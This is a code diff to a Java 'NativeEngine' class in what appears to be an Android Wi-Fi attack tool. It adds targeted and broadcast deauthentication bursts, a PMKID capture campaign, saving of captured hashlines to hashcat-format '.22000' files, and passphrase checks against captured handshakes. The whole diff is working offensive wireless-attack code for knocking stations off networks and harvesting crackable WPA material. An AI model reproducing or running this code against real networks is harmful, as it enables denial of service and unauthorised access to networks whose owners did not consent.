@@ -12,6 +12,9 @@ import com.opx.oss.engine.chips.ChipCatalog;
 import com.opx.oss.engine.attacks.Campaign;
 import com.opx.oss.engine.attacks.DeauthCampaign;
 import com.opx.oss.engine.attacks.DecloakCampaign;
+import com.opx.oss.engine.attacks.PmkidCampaign;
+import com.opx.oss.engine.capture.Handshake;
+import com.opx.oss.engine.capture.Verify;
 import com.opx.oss.engine.chips.WifiChip;
 import com.opx.oss.engine.chips.firmware.FirmwareStore;
 import com.opx.oss.engine.chips.rtl8187.Rtl8187Chip;
@@ -54,6 +57,8 @@ public final class NativeEngine {
     private final HandshakeBook handshakes = new HandshakeBook();
     private final ScanEngine scanEngine = new ScanEngine(scan);
     private final ProbeBook probes = new ProbeBook();
+    private final java.util.Set<String> silenced =
+            java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap<>());
     private volatile WifiChip chip;
     private volatile Campaign campaign;
     private volatile String campaignKind;
@@ -128,6 +133,21 @@ public final class NativeEngine {
                     break;
                 case "probed":
                     emit(event("probed").put("ssids", new JSONArray(probes.ssids())));
+                    break;
+                case "deauth_client":
+                    deauthClient(command.optString("bssid"), command.optString("client"));
+                    break;
+                case "deauth_all":
+                    deauthAll(command.optString("bssid"));
+                    break;
+                case "silence":
+                    silenced(command.optString("bssid"), command.optBoolean("on", true));
+                    break;
+                case "chop":
+                    emit(event("config").put("chop", command.optBoolean("on", false)));
+                    break;
+                case "verify_psk":
+                    verifyPsk(command.optString("bssid"), command.optString("psk"));
                     break;
                 case "scan":
                     scan(command.optInt("seconds", 0));
@@ -303,6 +323,77 @@ public final class NativeEngine {
         return adapter;
     }
 
+    /** Write one hashline to the vault and announce it, whoever captured it. */
+    private void saveCaptureLine(String bssid, String line) {
+        if (line == null || line.isEmpty()) return;
+        try {
+            java.io.File saved = Vault.save(context,
+                    "capture_" + (bssid == null ? "unknown" : bssid.replace(':', '-')) + ".22000",
+                    (line + "\n").getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            emit(event("capture_saved").put("file", saved.getName())
+                    .put("bssid", bssid).put("count", Vault.list(context).size()));
+        } catch (Exception e) {
+            error("cannot save the capture: " + e.getMessage());
+        }
+    }
+
+    /** One targeted deauth burst at a single station. */
+    private void deauthClient(String bssid, String client) throws Exception {
+        WifiChip adapter = requireChip(bssid);
+        if (adapter == null) return;
+        adapter.transmit(Frame.deauth(Mac.of(bssid), Mac.of(client), 7));
+        emit(event("attack_done").put("ok", true).put("kind", "deauth_client"));
+    }
+
+    private void deauthAll(String bssid) throws Exception {
+        WifiChip adapter = requireChip(bssid);
+        if (adapter == null) return;
+        adapter.transmit(Frame.deauthAll(Mac.of(bssid), 7));
+        emit(event("attack_done").put("ok", true).put("kind", "deauth_all"));
+    }
+
+    private WifiChip requireChip(String bssid) throws Exception {
+        String path = firstSupportedDevice();
+        if (path == null) {
+            error("no supported adapter is attached");
+            return null;
+        }
+        WifiChip adapter = openChip(path);
+        AccessPoint target = scan.get(bssid);
+        if (target != null && target.channel > 0) adapter.setChannel(target.channel);
+        return adapter;
+    }
+
+    private void silenced(String bssid, boolean on) {
+        if (on) {
+            silenced.add(bssid);
+        } else {
+            silenced.remove(bssid);
+        }
+        emitQuietly(event("silence").put("bssid", bssid).put("on", on));
+    }
+
+    /** Check a candidate passphrase against the handshakes captured for this network. */
+    private void verifyPsk(String bssid, String psk) {
+        boolean ok = false;
+        boolean any = false;
+        for (Handshake handshake : handshakes.list()) {
+            if (bssid != null && !bssid.isEmpty() && !bssid.equals(handshake.bssid)) continue;
+            any = true;
+            if (Verify.psk(handshake, psk)) {
+                ok = true;
+                break;
+            }
+        }
+        JSONObject reply = event("psk_verified");
+        try {
+            reply.put("ok", ok).put("have_handshake", any);
+        } catch (Exception ignored) {
+            // Two booleans cannot fail to serialize.
+        }
+        emitQuietly(reply);
+    }
+
     /** Start one campaign against one BSSID on the open adapter. */
     private void attack(JSONObject command) throws Exception {
         if (campaign != null) {
@@ -333,6 +424,9 @@ public final class NativeEngine {
             case "decloak":
                 starting = new DecloakCampaign(adapter, bssid, options, probes, scan);
                 break;
+            case "pmkid":
+                starting = new PmkidCampaign(adapter, bssid, options, scan, handshakes);
+                break;
             default:
                 error(kind + " is not available yet");
                 return;
@@ -347,7 +441,13 @@ public final class NativeEngine {
             boolean ok = true;
             String summary = "";
             try {
-                running.start(event -> emitQuietly(event));
+                running.start(entry -> {
+                    if ("capture_line".equals(entry.optString("event"))) {
+                        saveCaptureLine(entry.optString("bssid"), entry.optString("line"));
+                        return;
+                    }
+                    emitQuietly(entry);
+                });
                 summary = kind + " finished";
             } catch (Exception e) {
                 ok = false;
